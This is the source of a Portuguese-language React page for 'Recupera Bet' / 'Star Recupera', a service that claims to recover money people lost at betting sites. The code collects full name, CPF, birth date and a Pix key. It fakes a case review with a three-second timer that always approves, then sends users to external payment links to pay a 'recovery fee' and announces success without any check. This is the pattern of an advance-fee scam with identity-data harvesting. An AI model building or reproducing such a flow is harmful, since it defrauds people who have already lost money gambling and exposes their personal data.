import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Checkbox } from "@/components/ui/checkbox";
import { Slider } from "@/components/ui/slider";
import { ArrowLeft, Calculator, Mail, Shield, Lock, CreditCard, Loader2, CheckCircle } from "lucide-react";
import { Link } from "react-router-dom";

const Simulador = () => {
  const [valorPerdido, setValorPerdido] = useState([100]);
  const [valorCustomizado, setValorCustomizado] = useState("");
  const [usarValorCustomizado, setUsarValorCustomizado] = useState(false);
  const [casasSelecionadas, setCasasSelecionadas] = useState<string[]>([]);
  const [outraCasa, setOutraCasa] = useState("");
  const [maisDeCasa, setMaisDeCasa] = useState("");
  const [resultado, setResultado] = useState<{
    valorPerdido: number;
    taxa: number;
    valorPix: number;
    taxaEspecial: boolean;
   } | null>(null);
   
   // Estados do cadastro
   const [nomeCompleto, setNomeCompleto] = useState("");
   const [cpf, setCpf] = useState("");
   const [dataNascimento, setDataNascimento] = useState("");
   const [anoPerda, setAnoPerda] = useState("");
   
   // Estados do fluxo pós-cadastro
   const [etapaFluxo, setEtapaFluxo] = useState<'inicial' | 'analisando' | 'aprovado' | 'finalizado'>('inicial');
   const [chavePix, setChavePix] = useState("");
   const [analisandoTimer, setAnalisandoTimer] = useState(false);

  const calcularRecuperacao = () => {
    const valor = usarValorCustomizado 
      ? parseFloat(valorCustomizado.replace(/[^\d,]/g, '').replace(',', '.'))
      : valorPerdido[0];
    
    if (!valor || valor < 100) {
      alert('O valor mínimo para recuperação é R$ 100,00');
      return;
    }

    // Validação para valor customizado
    if (usarValorCustomizado && valor < 1000) {
      alert('Para valores customizados, o mínimo é R$ 1.000,00');
      return;
    }

    // Nova lógica de taxa fixa
    let taxa;
    if (valor >= 1000) {
      taxa = 100; // Taxa fixa para valores >= 1000
    } else if (valor >= 500) {
      taxa = 50; // Taxa fixa para valores de 500 a 999
    } else {
      taxa = 20; // Taxa fixa para valores de 100 a 499
    }
    
    const valorPix = valor - taxa;

    setResultado({
      valorPerdido: valor,
      taxa,
      valorPix,
      taxaEspecial: usarValorCustomizado || valor >= 1000
    });
  };

  const casasDeApostas = [
    "KTO", "Esporte da Sorte", "Blaze", "1xBet", "Betfair", "Betano", 
    "Bet365", "Sportingbet", "Rivalo", "Pixbet", "Parimatch", "F12.bet",
    "Galera.bet", "Casa de Apostas", "Betmotion", "LeoVegas", "Bodog",
    "Betway", "William Hill", "Stake", "BC.Game", "Sportsbet.io"
  ];

  const handleCasaChange = (casa: string, checked: boolean) => {
    if (checked) {
      setCasasSelecionadas([...casasSelecionadas, casa]);
    } else {
      setCasasSelecionadas(casasSelecionadas.filter(c => c !== casa));
    }
  };

  const formatarMoeda = (valor: number) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(valor);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value;
    // Remove tudo que não é número
    value = value.replace(/\D/g, '');
    // Adiciona as vírgulas para centavos
    if (value.length > 2) {
      value = value.slice(0, -2) + ',' + value.slice(-2);
    }
    // Adiciona os pontos para milhares
    value = value.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    // Adiciona R$
    if (value) {
      value = 'R$ ' + value;
    }
    setValorCustomizado(value);
  };
  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-background border-b border-border py-4">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            <img 
              src="/lovable-uploads/928040ae-c6d8-4f53-8ed2-05570d02f6b7.png" 
              alt="Recupera Bet" 
              className="h-12 w-auto"
            />
            <Link to="/">
              <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-primary">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Voltar para Landing Page
              </Button>
            </Link>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="py-12">
        <div className="container mx-auto px-4 max-w-2xl">
          {/* Hero Section */}
          <div className="text-center mb-12">
            <h1 className="text-4xl md:text-5xl font-bold text-foreground mb-4">
              Simule agora sua recuperação
            </h1>
            <p className="text-xl text-muted-foreground">
              Descubra em segundos quanto você pode receber de volta no Pix. <br />
              <span className="text-base">Valor mínimo: R$ 100,00</span>
            </p>
          </div>

          {/* Simulador */}
          <div className="bg-card border border-border rounded-2xl p-8 shadow-large">
            <div className="space-y-6">
              <div className="space-y-6">
                <Label htmlFor="valor" className="text-base font-semibold">
                  Selecione o valor que você perdeu (em R$)
                </Label>
                
                {!usarValorCustomizado ? (
                  <div className="space-y-4">
                    <div className="text-center">
                      <span className="text-3xl font-bold text-primary">
                        {formatarMoeda(valorPerdido[0])}
                      </span>
                    </div>
                    
                    <Slider
                      value={valorPerdido}
                      onValueChange={setValorPerdido}
                      max={1000}
                      min={100}
                      step={100}
                      className="w-full"
                    />
                    
                    <div className="flex justify-between text-sm text-muted-foreground">
                      <span>R$ 100</span>
                      <span>R$ 1.000</span>
                    </div>
                  </div>
                ) : (
                  <div className="space-y-4">
                    <Input
                      type="text"
                      placeholder="R$ 1.000,00 (mínimo)"
                      value={valorCustomizado}
                      onChange={handleInputChange}
                      className="text-lg h-12 text-center"
                    />
                    <p className="text-sm text-muted-foreground text-center">
                      Para valores maiores que R$ 1.000 - Taxa fixa: R$ 100
                    </p>
                  </div>
                )}

                <div className="flex items-center space-x-2 justify-center pt-4 border-t">
                  <Checkbox 
                    id="valor-customizado"
                    checked={usarValorCustomizado}
                    onCheckedChange={(checked) => {
                      setUsarValorCustomizado(checked as boolean);
                      if (!checked) setValorCustomizado("");
                    }}
                  />
                  <label htmlFor="valor-customizado" className="text-sm font-medium cursor-pointer">
                    Quero inserir um valor maior (a partir de R$ 1.000)
                  </label>
                </div>
              </div>

              <Button 
                onClick={calcularRecuperacao}
                className="w-full btn-cta-primary text-lg py-6"
                disabled={!valorPerdido[0] && !valorCustomizado}
              >
                <Calculator className="w-5 h-5 mr-2" />
                Calcular minha recuperação
              </Button>

              {/* Resultado */}
              {resultado && (
                <div className="mt-8 p-6 bg-accent rounded-xl border-2 border-primary">
                  <h3 className="text-xl font-bold text-accent-foreground mb-4">
                    Resultado da Simulação
                  </h3>
                  
                  <div className="space-y-3">
                    <div className="flex justify-between items-center">
                      <span className="text-accent-foreground">Valor perdido:</span>
                      <span className="font-semibold text-accent-foreground">
                        {formatarMoeda(resultado.valorPerdido)}
                      </span>
                    </div>
                    
                    <div className="flex justify-between items-center">
                      <span className="text-accent-foreground">Taxa da Recupera Bet:</span>
                      <span className="font-semibold text-accent-foreground">
                        {formatarMoeda(resultado.taxa)}
                      </span>
                    </div>
                    
                    <div className="text-sm text-primary font-medium bg-primary/10 p-2 rounded">
                      {resultado.valorPerdido >= 1000 ? (
                        "Taxa fixa para valores a partir de R$ 1.000: R$ 100,00"
                      ) : resultado.valorPerdido >= 500 ? (
                        "Taxa fixa para valores de R$ 500 a R$ 999: R$ 50,00"
                      ) : (
                        "Taxa fixa para valores de R$ 100 a R$ 499: R$ 20,00"
                      )}
                    </div>
                    
                    <div className="border-t border-primary pt-3">
                      <div className="flex justify-between items-center">
                        <span className="text-lg font-bold text-accent-foreground">
                          Valor no Pix:
                        </span>
                        <span className="text-2xl font-bold text-primary">
                          {formatarMoeda(resultado.valorPix)}
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {resultado && (
                <div className="space-y-4">
                  <div className="bg-muted p-4 rounded-lg border border-border">
                    <p className="text-sm text-muted-foreground flex items-start gap-2">
                      <span className="text-orange-500">⚠️</span>
                      <span>
                        <strong>Não precisa ser o valor exato, apenas aproximado.</strong> Caso você tenha perdido um valor maior, a equipe da Recupera Bet entrará em contato com você.
                      </span>
                    </p>
                  </div>
                  <div className="text-center">
                    <p className="text-sm text-muted-foreground mb-6">
                      O pagamento pode ser realizado em até 7 dias úteis, dependendo da casa de apostas.
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Seção de Casas de Apostas */}
          {resultado && (
            <div className="bg-card border border-border rounded-2xl p-8 shadow-large mt-8">
              <h3 className="text-2xl font-bold text-foreground mb-6 text-center">
                Por qual casa de apostas você perdeu dinheiro?
              </h3>
              
              <div className="space-y-6">
                {/* Lista de Casas */}
                <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                  {casasDeApostas.map((casa) => (
                    <div key={casa} className="flex items-center space-x-2">
                      <Checkbox 
                        id={casa}
                        checked={casasSelecionadas.includes(casa)}
                        onCheckedChange={(checked) => handleCasaChange(casa, checked as boolean)}
                      />
                      <label 
                        htmlFor={casa} 
                        className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer"
                      >
                        {casa}
                      </label>
                    </div>
                  ))}
                </div>

                {/* Opções Especiais */}
                <div className="space-y-4 border-t pt-6">
                  <div className="space-y-2">
                    <div className="flex items-center space-x-2">
                      <Checkbox 
                        id="outra-casa"
                        checked={casasSelecionadas.includes("outra")}
                        onCheckedChange={(checked) => {
                          handleCasaChange("outra", checked as boolean);
                          if (!checked) setOutraCasa("");
                        }}
                      />
                      <label htmlFor="outra-casa" className="text-sm font-medium cursor-pointer">
                        Outra casa
                      </label>
                    </div>
                    {casasSelecionadas.includes("outra") && (
                      <Input
                        placeholder="Digite o nome da casa de apostas"
                        value={outraCasa}
                        onChange={(e) => setOutraCasa(e.target.value)}
                        className="ml-6"
                      />
                    )}
                  </div>

                  <div className="space-y-2">
                    <div className="flex items-center space-x-2">
                      <Checkbox 
                        id="mais-casas"
                        checked={casasSelecionadas.includes("multiplas")}
                        onCheckedChange={(checked) => {
                          handleCasaChange("multiplas", checked as boolean);
                          if (!checked) setMaisDeCasa("");
                        }}
                      />
                      <label htmlFor="mais-casas" className="text-sm font-medium cursor-pointer">
                        Mais de uma casa
                      </label>
                    </div>
                    {casasSelecionadas.includes("multiplas") && (
                      <Textarea
                        placeholder="Digite as casas de apostas (uma por linha ou separadas por vírgula)"
                        value={maisDeCasa}
                        onChange={(e) => setMaisDeCasa(e.target.value)}
                        className="ml-6"
                        rows={3}
                      />
                    )}
                  </div>
                </div>

                {/* Seção de Cadastro */}
                {(casasSelecionadas.length > 0 || outraCasa || maisDeCasa) && (
                  <div className="space-y-6 pt-8 border-t border-border">
                    <div className="text-center">
                      <h3 className="text-2xl font-bold text-foreground mb-2">
                        Dados para Recuperação
                      </h3>
                      <p className="text-muted-foreground">
                        Preencha seus dados para iniciarmos o processo de recuperação
                      </p>
                    </div>

                    <div className="grid md:grid-cols-2 gap-6">
                      <div className="space-y-2">
                        <Label htmlFor="nome">Nome Completo *</Label>
                        <Input
                          id="nome"
                          type="text"
                          placeholder="Digite seu nome completo"
                          value={nomeCompleto}
                          onChange={(e) => setNomeCompleto(e.target.value)}
                          className="h-12"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="cpf">CPF *</Label>
                        <Input
                          id="cpf"
                          type="text"
                          placeholder="000.000.000-00"
                          value={cpf}
                          onChange={(e) => setCpf(e.target.value)}
                          className="h-12"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="nascimento">Data de Nascimento *</Label>
                        <Input
                          id="nascimento"
                          type="date"
                          value={dataNascimento}
                          onChange={(e) => setDataNascimento(e.target.value)}
                          className="h-12"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="ano-perda">Ano Aproximado que Perdeu o Dinheiro *</Label>
                        <Input
                          id="ano-perda"
                          type="number"
                          placeholder="2023"
                          min="2020"
                          max="2024"
                          value={anoPerda}
                          onChange={(e) => setAnoPerda(e.target.value)}
                          className="h-12"
                        />
                      </div>
                    </div>
                  </div>
                )}

                {/* Botão Final */}
                <div className="text-center pt-6">
                  <Button 
                    className="btn-cta-primary text-lg py-6 px-8"
                    onClick={() => {
                      setEtapaFluxo('analisando');
                      setAnalisandoTimer(true);
                      
                      // Simular análise por 3 segundos
                      setTimeout(() => {
                        setAnalisandoTimer(false);
                        setEtapaFluxo('aprovado');
                      }, 3000);
                    }}
                    disabled={
                      (casasSelecionadas.length > 0 || outraCasa || maisDeCasa) && 
                      (!nomeCompleto || !cpf || !dataNascimento || !anoPerda)
                    }
                  >
                    🚀 Iniciar minha recuperação agora
                  </Button>
                  {(casasSelecionadas.length > 0 || outraCasa || maisDeCasa) && 
                   (!nomeCompleto || !cpf || !dataNascimento || !anoPerda) && (
                    <p className="text-sm text-muted-foreground mt-2">
                      Preencha todos os campos obrigatórios para continuar
                    </p>
                  )}
                </div>
              </div>
            </div>
          )}
          
          {/* Fluxo Pós-Cadastro */}
          {etapaFluxo === 'analisando' && (
            <div className="bg-card border border-border rounded-2xl p-8 shadow-large mt-8">
              <div className="text-center space-y-6">
                <Loader2 className="w-16 h-16 animate-spin mx-auto text-primary" />
                <h3 className="text-2xl font-bold text-foreground">
                  Analisando seu caso...
                </h3>
                <p className="text-muted-foreground">
                  Nossa equipe está verificando suas informações. Aguarde alguns instantes.
                </p>
              </div>
            </div>
          )}

          {etapaFluxo === 'aprovado' && (
            <div className="bg-card border border-border rounded-2xl p-8 shadow-large mt-8">
              <div className="text-center space-y-6">
                <CheckCircle className="w-16 h-16 mx-auto text-green-500" />
                <h3 className="text-2xl font-bold text-foreground">
                  Parabéns! Seu cadastro foi aprovado
                </h3>
                <p className="text-muted-foreground">
                  Para finalizar o processo, precisamos de mais algumas informações:
                </p>
                
                <div className="space-y-6 max-w-md mx-auto">
                  <div className="space-y-2">
                    <Label htmlFor="chave-pix">Sua Chave PIX *</Label>
                    <Input
                      id="chave-pix"
                      type="text"
                      placeholder="Digite sua chave PIX (CPF, e-mail, telefone ou chave aleatória)"
                      value={chavePix}
                      onChange={(e) => setChavePix(e.target.value)}
                      className="h-12"
                    />
                  </div>
                  
                  <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                    <h4 className="font-semibold text-yellow-800 mb-2">
                      Para estar 100% aprovado
                    </h4>
                    <p className="text-yellow-700 text-sm mb-3">
                      Pedimos que você faça o pagamento da taxa de recuperação:
                    </p>
                    <div className="text-center">
                      <span className="text-2xl font-bold text-yellow-800">
                        {resultado && formatarMoeda(resultado.taxa)}
                      </span>
                    </div>
                    <p className="text-yellow-700 text-xs mt-2">
                      Em até 7 dias o dinheiro será reembolsado para sua conta
                    </p>
                  </div>
                  
                  <Button 
                    className="w-full btn-cta-primary text-lg py-6"
                    onClick={() => {
                      if (!chavePix.trim()) {
                        alert('Por favor, insira sua chave PIX');
                        return;
                      }
                      
                      // Redirecionar para o link de pagamento baseado no valor
                      let paymentLink = '';
                      if (resultado.valorPerdido >= 100 && resultado.valorPerdido <= 500) {
                        paymentLink = 'https://app.pushinpay.com.br/service/pay/9fd94ae1-a92a-48e1-84f1-f839e86d842e';
                      } else if (resultado.valorPerdido >= 500 && resultado.valorPerdido <= 900) {
                        paymentLink = 'https://app.pushinpay.com.br/service/pay/9fd94b37-2512-49d9-88fe-4f185cc0fb02';
                      } else {
                        // Para valores acima de 900, usar o primeiro link
                        paymentLink = 'https://app.pushinpay.com.br/service/pay/9fd94ae1-a92a-48e1-84f1-f839e86d842e';
                      }
                      window.open(paymentLink, '_blank');
                      setEtapaFluxo('finalizado');
                    }}
                    disabled={!chavePix.trim()}
                  >
                    💳 Pagar Taxa de Recuperação
                  </Button>
                </div>
              </div>
            </div>
          )}

          {etapaFluxo === 'finalizado' && (
            <div className="bg-card border border-border rounded-2xl p-8 shadow-large mt-8">
              <div className="text-center space-y-6">
                <CheckCircle className="w-16 h-16 mx-auto text-green-500" />
                <h3 className="text-2xl font-bold text-foreground">
                  Processo Finalizado!
                </h3>
                <div className="bg-green-50 border border-green-200 rounded-lg p-4 max-w-md mx-auto">
                  <p className="text-green-700">
                    ✅ Cadastro aprovado<br />
                    ✅ Chave PIX confirmada<br />
                    ✅ Taxa paga com sucesso
                  </p>
                </div>
                <p className="text-muted-foreground">
                  Seu dinheiro será reembolsado em até <strong>7 dias úteis</strong> diretamente na sua conta PIX.
                </p>
                <p className="text-sm text-muted-foreground">
                  Você receberá atualizações por e-mail sobre o andamento do seu processo.
                </p>
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-brand-secondary text-brand-secondary-foreground py-12 mt-16">
        <div className="container mx-auto px-4">
          <div className="grid md:grid-cols-3 gap-8">
            {/* Contato */}
            <div>
              <h3 className="text-lg font-semibold mb-4">Contato</h3>
              <div className="space-y-2">
                <div className="flex items-center gap-2">
                  <Mail className="w-4 h-4" />
                  <a href="mailto:contato@starrecupera.com" className="hover:text-brand-accent transition-colors">
                    contato@starrecupera.com
                  </a>
                </div>
                <div className="flex items-center gap-2">
                  <Mail className="w-4 h-4" />
                  <a href="mailto:suporte@starrecupera.com" className="hover:text-brand-accent transition-colors">
                    suporte@starrecupera.com
                  </a>
                </div>
              </div>
            </div>

            {/* Links */}
            <div>
              <h3 className="text-lg font-semibold mb-4">Links Úteis</h3>
              <div className="space-y-2">
                <a href="#" className="block hover:text-brand-accent transition-colors">
                  Termos de Uso
                </a>
                <a href="#" className="block hover:text-brand-accent transition-colors">
                  Política de Privacidade
                </a>
              </div>
            </div>

            {/* Segurança */}
            <div>
              <h3 className="text-lg font-semibold mb-4">Segurança</h3>
              <div className="flex gap-4">
                <div className="flex items-center gap-2 text-sm">
                  <Shield className="w-5 h-5" />
                  <span>SSL Certificado</span>
                </div>
                <div className="flex items-center gap-2 text-sm">
                  <Lock className="w-5 h-5" />
                  <span>Pix Seguro</span>
                </div>
                <div className="flex items-center gap-2 text-sm">
                  <CreditCard className="w-5 h-5" />
                  <span>Dados Protegidos</span>
                </div>
              </div>
            </div>
          </div>
          
          <div className="border-t border-brand-secondary-foreground/20 mt-8 pt-8 text-center text-sm">
            <p>&copy; 2024 Star Recupera. Todos os direitos reservados.</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Simulador;